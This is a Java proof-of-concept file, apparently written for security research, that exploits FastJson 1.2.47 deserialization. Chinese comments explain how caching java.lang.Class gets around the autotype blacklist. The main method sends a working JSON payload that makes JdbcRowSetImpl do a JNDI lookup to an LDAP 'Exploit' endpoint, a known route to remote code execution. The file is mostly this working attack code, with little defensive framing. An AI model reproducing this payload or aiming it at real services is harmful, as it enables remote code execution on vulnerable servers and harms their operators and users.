package com.jemmy.serialize.leak;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.sun.rowset.JdbcRowSetImpl;

/**
 * FastJson ver: 1.2.47
 * jdk8u181
 *
 * 1. 利用到了java.lang.class，这个类不在黑名单，所以checkAutotype可以过
 * 2. 这个java.lang.class类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，
 *      如果fastjson cache为true，就会缓存这个val对应的class到全局map中
 * 3. 如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，直接返回
 *
 * @author zhujiang.cheng
 * @since 2020/6/3
 */
public class JdbcRowSetClassAttack {

    public static void main(String[] args) {
        String payload = "{\n" +
            "    \"rand1\": {\n" +
            "        \"@type\": \"java.lang.Class\", \n" +
            "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
            "    }, \n" +
            "    \"rand2\": {\n" +
            "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \n" +
            "        \"dataSourceName\": \"ldap://localhost:1389/Exploit\", \n" +
            "        \"autoCommit\": true\n" +
            "    }\n" +
            "}";
        JSONObject jsonObject = JSON.parseObject(payload);
        JdbcRowSetImpl jdbcRowSet = (JdbcRowSetImpl) jsonObject.get("rand2");
        System.out.println(jdbcRowSet);
    }

}
